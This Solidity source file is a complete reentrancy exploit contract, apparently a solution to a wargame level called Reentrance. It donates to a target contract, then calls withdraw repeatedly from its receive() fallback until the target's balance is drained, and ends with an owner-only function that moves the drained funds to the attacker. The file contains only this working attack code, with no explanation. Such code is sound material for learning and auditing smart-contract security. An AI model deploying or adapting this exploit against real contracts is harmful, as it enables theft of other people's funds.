// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttack {
    address private owner;
    uint256 private amount;
    Reentrance private target;

    constructor() public {
        owner = msg.sender;
    }

    function attack(Reentrance reentrance) payable public {
        require(msg.sender == owner);
        target = reentrance;

        amount = msg.value;
        reentrance.donate{value: amount}(address(this));
        reentrance.withdraw(amount);
    }

    receive() payable external {
        uint256 balance = address(target).balance;
        if (balance == 0) {
            return;
        }

        uint256 withdrawAmount = amount > address(target).balance ? address(target).balance : amount;
        target.withdraw(withdrawAmount);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
